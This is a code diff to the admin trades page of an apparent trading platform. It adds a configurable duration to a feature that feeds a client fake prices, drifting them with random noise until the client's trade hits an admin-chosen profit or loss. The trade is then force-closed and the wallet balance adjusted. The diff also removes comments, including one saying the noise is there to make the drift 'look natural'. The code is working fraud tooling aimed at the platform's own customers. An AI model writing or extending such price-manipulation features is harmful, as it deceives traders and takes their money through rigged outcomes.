@@ -20,6 +20,8 @@ const AdminTrades = () => {
   const [overrideOpen, setOverrideOpen] = useState<any>(null);
   const [overrideMode, setOverrideMode] = useState("none");
   const [targetValue, setTargetValue] = useState("");
+  const [durationSec, setDurationSec] = useState(60);
+  const [customDuration, setCustomDuration] = useState("");
   const [livePrices, setLivePrices] = useState<Record<string, number>>({});
   const [manipulating, setManipulating] = useState<Record<string, boolean>>({});
 
@@ -106,19 +108,17 @@ const AdminTrades = () => {
       : entry * (1 - ratio);
   };
 
-  const startGradualManipulation = async (trade: any, forcedPnl: number) => {
+  const startGradualManipulation = async (trade: any, forcedPnl: number, totalDurationSec: number) => {
     const targetPrice = calcTargetPrice(trade, forcedPnl);
     const symbol = trade.assets?.symbol;
     const currentMarketPrice = livePrices[symbol] || Number(trade.entry_price);
-    const steps = 20;
-    const intervalMs = 3000; // 3s per step = 60s total
+    const steps = Math.max(Math.round(totalDurationSec / 3), 4);
+    const intervalMs = (totalDurationSec * 1000) / steps;
     const priceStep = (targetPrice - currentMarketPrice) / steps;
     let step = 0;
 
     setManipulating(prev => ({ ...prev, [trade.id]: true }));
 
-    // CRITICAL: Immediately store the target P&L on the trade so if the client
-    // closes during manipulation, the correct P&L is preserved
     await supabase.from("trades").update({ 
       current_price: currentMarketPrice,
       pnl: forcedPnl,
@@ -126,7 +126,6 @@ const AdminTrades = () => {
 
     const timer = setInterval(async () => {
       step++;
-      // Add small random noise to make it look natural
       const noise = (Math.random() - 0.5) * Math.abs(priceStep) * 0.3;
       const newPrice = currentMarketPrice + priceStep * step + (step < steps ? noise : 0);
       const finalPrice = step >= steps ? targetPrice : +newPrice.toFixed(newPrice < 1 ? 6 : 2);
@@ -136,19 +135,16 @@ const AdminTrades = () => {
       if (step >= steps) {
         clearInterval(timer);
 
-        // Check if client already closed the trade during manipulation
         const { data: currentTrade } = await supabase
           .from("trades").select("status").eq("id", trade.id).maybeSingle();
         
         if (currentTrade?.status === "closed") {
-          // Client already closed — trade has correct P&L from pnl field
           setManipulating(prev => ({ ...prev, [trade.id]: false }));
           toast.success(`Manipulation complete — client already closed with target P&L`);
           fetchTrades();
           return;
         }
 
-        // Close the trade with target P&L
         await supabase.from("trades").update({
           status: "closed",
           closed_at: new Date().toISOString(),
@@ -156,7 +152,6 @@ const AdminTrades = () => {
           current_price: targetPrice,
         }).eq("id", trade.id);
 
-        // Credit wallet
         const { data: wallet } = await supabase
           .from("wallets").select("id, balance")
           .eq("user_id", trade.user_id).eq("currency", "EUR").maybeSingle();
@@ -173,7 +168,7 @@ const AdminTrades = () => {
     }, intervalMs);
   };
 
-  const setOverride = async () => {
+  const setOverride = async (resolvedDuration?: number) => {
     if (!overrideOpen) return;
     const trade = overrideOpen;
 
@@ -210,9 +205,10 @@ const AdminTrades = () => {
       }
 
       if (trade.status === "open") {
-        // Start gradual manipulation over ~60 seconds
-        toast.info(`Starting manipulation — P&L will reach €${forcedPnl.toFixed(2)} over 60 seconds. Stay on this page.`);
-        startGradualManipulation(trade, forcedPnl);
+        const dur = resolvedDuration ?? durationSec;
+        const finalDur = dur === -1 ? Math.max(5, Number(customDuration) || 60) : dur;
+        toast.info(`Starting manipulation — P&L will reach €${forcedPnl.toFixed(2)} over ${finalDur}s. Stay on this page.`);
+        startGradualManipulation(trade, forcedPnl, finalDur);
       } else {
         // Already closed — update P&L directly
         const oldPnl = Number(trade.pnl ?? 0);
@@ -308,6 +304,8 @@ const AdminTrades = () => {
               setOverrideOpen(t);
               setOverrideMode(override?.override_mode ?? "none");
               setTargetValue(override?.target_value?.toString() ?? "");
+              setDurationSec(60);
+              setCustomDuration("");
             }}>
               Override
             </Button>
@@ -428,10 +426,42 @@ const AdminTrades = () => {
                 </p>
               </div>
             )}
+            {overrideMode !== "none" && overrideOpen?.status === "open" && (
+              <div className="space-y-1">
+                <Label>Manipulation Duration</Label>
+                <Select value={String(durationSec)} onValueChange={(v) => {
+                  if (v === "custom") {
+                    setDurationSec(-1);
+                    setCustomDuration("");
+                  } else {
+                    setDurationSec(Number(v));
+                  }
+                }}>
+                  <SelectTrigger><SelectValue /></SelectTrigger>
+                  <SelectContent>
+                    <SelectItem value="10">10 seconds</SelectItem>
+                    <SelectItem value="30">30 seconds</SelectItem>
+                    <SelectItem value="60">1 minute</SelectItem>
+                    <SelectItem value="300">5 minutes</SelectItem>
+                    <SelectItem value="custom">Custom</SelectItem>
+                  </SelectContent>
+                </Select>
+                {durationSec === -1 && (
+                  <div className="mt-2">
+                    <Input type="number" value={customDuration} onChange={(e) => setCustomDuration(e.target.value)}
+                      placeholder="Duration in seconds" min={5} />
+                    <p className="text-xs text-muted-foreground mt-1">Enter duration in seconds (min 5)</p>
+                  </div>
+                )}
+                <p className="text-xs text-muted-foreground mt-1">
+                  How long the price will gradually drift to reach the target P&L
+                </p>
+              </div>
+            )}
           </div>
           <DialogFooter>
             <Button variant="outline" onClick={() => setOverrideOpen(null)}>Cancel</Button>
-            <Button onClick={setOverride}>Apply Override</Button>
+            <Button onClick={() => setOverride()}>Apply Override</Button>
           </DialogFooter>
         </DialogContent>
       </Dialog>
